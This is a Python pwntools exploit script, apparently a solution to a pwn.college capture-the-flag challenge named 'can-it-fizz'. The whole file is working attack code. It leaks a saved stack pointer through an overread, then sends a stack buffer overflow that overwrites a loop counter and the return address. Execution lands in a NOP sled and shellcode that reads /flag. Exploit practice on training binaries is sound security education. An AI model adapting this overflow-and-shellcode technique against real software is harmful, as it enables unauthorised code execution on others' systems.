#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

buf_rbp = 76

buf_count = 56


def exploit():
    p = process("/challenge/can-it-fizz")

    # stage 1
    p.recvuntil(b"0: ")
    payload1 = b"A" * buf_rbp
    payload2 = (
        b"A" * buf_count
        + b"\xff\xff\xff\xff"
        + b"A" * (buf_rbp - buf_count - 4)
    )
    p.send(payload1)

    p.recvuntil(b"You entered: " + payload1)
    rbp_leak = p.recv(6)
    rbp = u64(rbp_leak.ljust(8, b"\x00"))
    print(f"rbp leak: {rbp_leak}")

    print(p.recvall(timeout=1))

    # stage 2
    p.recvuntil(b"0: ")
    shellcode = asm(shellcraft.cat("/flag"))

    # pad + loop count + pad + dummy rbp + return address + nop + shellcode
    payload2 = (
        b"A" * buf_count
        + b"\x90\x90\x90\x90"
        + b"A" * (buf_rbp - buf_count - 4)
        + 8 * b"\x90"
        + p64(rbp)
        + b"\x90" * 1000
        + shellcode
    )
    p.send(payload2)

    result = p.recvall(timeout=1)
    if b"pwn.college{" in result:
        print(result)
        return


if __name__ == "__main__":
    exploit()
